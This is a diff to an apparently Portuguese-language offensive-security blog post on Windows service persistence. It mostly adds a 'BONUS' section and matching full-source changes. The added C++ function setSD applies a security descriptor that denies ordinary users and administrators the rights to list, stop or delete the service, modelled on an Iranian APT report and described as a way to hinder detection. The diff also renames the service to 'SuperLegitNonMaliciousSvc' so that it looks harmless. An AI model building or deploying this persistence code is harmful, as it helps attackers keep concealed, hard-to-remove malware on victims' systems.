@@ -65,9 +65,9 @@ VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
 	}
 ```
 
-O Handle, nesse caso a função ```ServiceCtrlHandler```, recebe um "control code" para atualizar o status do service. Segundo a documentação, o Handler agir quando o control code causar alteração no status do service. 
+O Handle, nesse caso a função ```ServiceCtrlHandler```, recebe um "control code" para atualizar o status do service. Segundo a documentação, o Handler deve agir quando o control code causar alteração no status do service. 
 
-Na função abaixo se o Handler ```SERVICE_CONTROL_STOP``` mas o status do service for ```SERVICE_RUNNING``` ele não faz nada e o service continua rodando. 
+Na função abaixo se o control code for ```SERVICE_CONTROL_STOP``` mas o status do service for ```SERVICE_RUNNING``` ele não faz nada e o service continua rodando. 
 
 Se não o status é setado para SERVICE_STOP_PENDING, que não encerra a execução, só espera o programa ser encerrado. Quando o programa é encerrado chama ```SetEvent(css_ServiceStopEvent);``` para shutdown no service (```css_ServiceStopEvent``` é um var global usada só pra stop do service).
 
@@ -242,6 +242,55 @@ void UninstallService() {
 ![msf2](/img/msf2.png)
 
 
+## BONUS
+
+- Baseado nesse [report](https://www.clearskysec.com/wp-content/uploads/2017/07/Operation_Wilted_Tulip.pdf) de 2017 sobre um APT Iraniano que usa um service como persistencia, decidi adicionar uma função a mais que seta um ```Security Descriptor``` bem útil para dificultar a detecção da persistencia. Esse Security Descriptor adiciona regras que bloqueiam usuários comuns e admins possam listar, editar, parar ou deletar o service. 
+
+Isso é bem útil só que tem um porblema, durante meus testes notei que se o defender conseguir detectar o binario malicioso ele o deleta mas não consegue deletar o service associado a ele. É interessante porém inultiliza a persistencia, então é necessario um implant que contornasse isso.
+
+A função abaixo seta o Security Descriptor logo após a criação do service.
+
+Após a criação os comandos query, stop, delete retornam "access denied", uma das poucas formas de listar/ver o service é com ```sc.exe qc NAME```.
+
+Ainda é possivel adicionar mais funções que estão no report como a verificação de internet para iniciar o binário, alguma tecnica de sleep e por ai vai.
+
+```cpp
+int setSD(SC_HANDLE hSCM, SC_HANDLE hService) {
+
+	LPCWSTR sddl =
+		L"D:(D;;DCLCWPDTSD;;;IU)"
+		L"(D;;DCLCWPDTSD;;;SU)"
+		L"(D;;DCLCWPDTSD;;;BA)"
+		L"(A;;CCLCSWLOCRRC;;;IU)"
+		L"(A;;CCLCSWLOCRRC;;;SU)"
+		L"(A;;CCLCSWRPWPDTLOCRRC;;;SY)"
+		L"(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
+		L"S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)";
+
+	PSECURITY_DESCRIPTOR pSD = NULL;
+
+	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(sddl, SDDL_REVISION_1, &pSD, NULL)) {
+
+		return 1;
+	}
+
+	SECURITY_INFORMATION si = DACL_SECURITY_INFORMATION | SCOPE_SECURITY_INFORMATION;
+
+	if (!SetServiceObjectSecurity(hService, si, pSD)) {
+		return 1;
+	}
+
+	return 0;
+}
+
+...
+
+
+```
+
+- [https://learn.microsoft.com/en-us/windows/win32/services/modifying-the-dacl-for-a-service](https://learn.microsoft.com/en-us/windows/win32/services/modifying-the-dacl-for-a-service)
+
+
 ## Full source
 
 ```cpp
@@ -250,13 +299,17 @@ void UninstallService() {
 #include <stdio.h>
 #include <winhttp.h>
 #include <string.h>
+#include <winsock.h>
+#include <sddl.h>
+
 
 #pragma comment(lib, "ntdll.lib")
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "advapi32.lib")
+#pragma comment (lib, "Ws2_32.lib")
 
 #define DEFAULT_BUFLEN 4096
-#define SERVICE_NAME TEXT("EvilSvc")
+#define SERVICE_NAME TEXT("SuperLegitNonMaliciousSvc")
 
 SERVICE_STATUS css_ServiceStatus;
 SERVICE_STATUS_HANDLE css_StatusHandle;
@@ -419,6 +472,34 @@ int callFuncs() {
 	return 0;
 }
 
+int setSD(SC_HANDLE hSCM, SC_HANDLE hService) {
+
+	LPCWSTR sddl =
+		L"D:(D;;DCLCWPDTSD;;;IU)"
+		L"(D;;DCLCWPDTSD;;;SU)"
+		L"(D;;DCLCWPDTSD;;;BA)"
+		L"(A;;CCLCSWLOCRRC;;;IU)"
+		L"(A;;CCLCSWLOCRRC;;;SU)"
+		L"(A;;CCLCSWRPWPDTLOCRRC;;;SY)"
+		L"(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
+		L"S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)";
+
+	PSECURITY_DESCRIPTOR pSD = NULL;
+
+	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(sddl, SDDL_REVISION_1, &pSD, NULL)) {
+
+		return 1;
+	}
+
+	SECURITY_INFORMATION si = DACL_SECURITY_INFORMATION | SCOPE_SECURITY_INFORMATION;
+
+	if (!SetServiceObjectSecurity(hService, si, pSD)) {
+		return 1;
+	}
+
+	return 0;
+}
+
 
 VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode)
 {
@@ -504,6 +585,7 @@ void InstallService() {
 		TCHAR path[_MAX_PATH + 1];
 		if (GetModuleFileName(0, path, sizeof(path) / sizeof(path[0])) > 0) {
 			SC_HANDLE service = CreateService(ServiceControlManager, SERVICE_NAME, SERVICE_NAME, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path, 0, 0, 0, 0, 0);
+			setSD(ServiceControlManager, service);
 			if (!StartService(service, NULL, NULL)) {
 				return;
 			}
@@ -532,7 +614,7 @@ void UninstallService() {
 
 
 int main(int argc, char *argv[]) {
-	printf("Error: no args!!!!\n");
+	printf("Error - no args!!!!!\n");
 
 	if (argc > 1 && strcmp(argv[1], "install") == 0) {
 		InstallService();
@@ -553,6 +635,7 @@ int main(int argc, char *argv[]) {
 	}
 	
 	return 0;
+
 }
 ```
 
